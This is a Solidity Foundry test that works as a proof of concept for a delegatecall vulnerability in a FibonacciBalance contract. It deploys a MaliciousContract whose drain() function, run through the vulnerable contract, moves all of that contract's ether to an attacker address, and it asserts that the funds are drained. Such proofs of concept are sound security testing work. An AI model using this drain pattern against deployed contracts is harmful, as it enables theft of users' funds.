// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/FibonacciBalance.sol";

contract FibonacciBalanceTest is Test {
    FibonacciBalance public fibBal;
    MaliciousContract public maliciousContract;
    address attacker = makeAddr("attacker");
    address otherUser = makeAddr("otherUser");

    function setUp() public {
        // Deploy malicious contract that will exploit the delegatecall vulnerability
        maliciousContract = new MaliciousContract();
        
        // Deploy FibonacciBalance and send 1 ether to it
        fibBal = new FibonacciBalance{value: 1 ether}(address(maliciousContract));
    }

    function testDelegatecallVulnerability() public {
        // Capture state before attack
        uint256 contractBalanceBefore = address(fibBal).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        
        console.log("--- BEFORE-Trigger State ---");
        console.log("Contract balance (FibonacciBalance): %s", contractBalanceBefore);
        console.log("Attacker ETH balance: %s", attackerBalanceBefore);
        
        console.log("--- Trigger Attack ---");
        // Attacker triggers arbitrary delegatecall to drain contract funds
        vm.prank(attacker);
        (bool success,) = address(fibBal).call(
            abi.encodeWithSelector(maliciousContract.drain.selector)
        );
        require(success, "Delegatecall attack failed");
        console.log("Attack transaction completed");
        
        // Capture state after attack
        uint256 contractBalanceAfter = address(fibBal).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        
        console.log("--- AFTER-Trigger State ---");
        console.log("Contract balance (FibonacciBalance): %s", contractBalanceAfter);
        console.log("Attacker ETH balance: %s", attackerBalanceAfter);
        
        console.log("--- State Change Verification ---");
        console.log("Contract balance change: %s (delta)", contractBalanceBefore - contractBalanceAfter);
        console.log("Attacker balance change: %s (delta)", attackerBalanceAfter - attackerBalanceBefore);
        
        // Determine if vulnerability was successfully exploited
        bool fundsDrained = contractBalanceAfter == 0;
        bool attackerGainedFunds = attackerBalanceAfter == attackerBalanceBefore + contractBalanceBefore;
        
        // Final vulnerability verdict
        if (fundsDrained && attackerGainedFunds) {
            console.log("Vulnerability Exists: Delegatecall attack successfully drained contract funds");
        } else {
            console.log("Vulnerability not Exist: Failed to transfer funds or incorrect amounts");
        }

        // Maintain original assertions for test framework
        assertEq(address(fibBal).balance, 0, "Contract funds not drained");
        assertEq(
            attacker.balance, 
            attackerBalanceBefore + contractBalanceBefore,
            "Attacker did not receive funds"
        );
    }
}

contract MaliciousContract {
    function drain() public {
        // This will execute in the context of the calling contract (FibonacciBalance)
        address receiver = msg.sender;
        payable(receiver).transfer(address(this).balance);
    }
}